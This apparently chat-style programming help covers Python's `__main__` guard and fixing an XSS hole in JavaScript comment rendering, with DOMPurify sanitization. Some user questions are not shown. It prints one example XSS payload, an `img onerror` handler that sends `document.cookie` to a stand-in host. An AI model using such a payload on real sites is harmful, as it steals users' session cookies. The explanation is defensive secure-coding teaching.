It runs the code under it only when the file is executed directly, not when it's imported.

Python sets `__name__` to `"__main__"` in the file you run (`python report.py`), and to the module name (`"report"`) when another file does `import report`. Without the guard, importing your file to reuse a function would also execute all its top-level code: reading files, starting a loop, calling `input()`.

```python
# report.py
def total(values):
    return sum(values)


def main():
    print(total([1, 2, 3]))


if __name__ == "__main__":
    main()
```

Now `python report.py` prints `6`, while `from report import total` in a test or another script gives you the function without side effects.

For a single throwaway script you'll never import, it makes no difference. It becomes necessary once you write tests, split code into modules, or use `multiprocessing` on Windows, where child processes re-import your main file and would otherwise start everything again.

I'm rendering comments like this and it works fine:
```js
comments.forEach(c => {
  list.innerHTML += `<li><b>${c.author}</b>: ${c.text}</li>`;
});
```
is there anything wrong with it?

Yes, it's an XSS hole. `author` and `text` come from users, and `innerHTML` parses them as HTML. A comment like this one runs code in the browser of everyone who opens the page:

```html
<img src=x onerror="fetch('https://evil.example/?c=' + document.cookie)">
```

(`<script>` tags inserted through `innerHTML` don't execute, but event handler attributes like `onerror` do.)

Build the elements and put user text in with `textContent`, or pass strings to `append()`, which always creates text nodes:

```js
for (const c of comments) {
  const li = document.createElement('li');
  const author = document.createElement('b');
  author.textContent = c.author;
  li.append(author, ': ', c.text);
  list.append(li);
}
```

This also fixes a second problem: `innerHTML +=` re-serializes and re-parses the whole list on every iteration, which gets slow with many comments and throws away any event listeners attached to the existing items.

Then convert the markdown to HTML and sanitize the result with an allowlist before inserting it. DOMPurify is the standard library for this:

```js
import DOMPurify from 'dompurify';
import { marked } from 'marked';

const html = DOMPurify.sanitize(marked.parse(c.text), {
  ALLOWED_TAGS: ['p', 'b', 'strong', 'i', 'em', 'a', 'code'],
  ALLOWED_ATTR: ['href'],
});
textEl.innerHTML = html;
```

Sanitize the final HTML, not the markdown input: markdown parsers pass raw HTML through by default, so `<img onerror=...>` inside a comment survives the conversion. DOMPurify also strips `javascript:` URLs from `href`.

Don't write your own regex-based sanitizer. Attribute quoting, URL schemes and malformed tags make it very easy to miss a case, and one miss is enough.

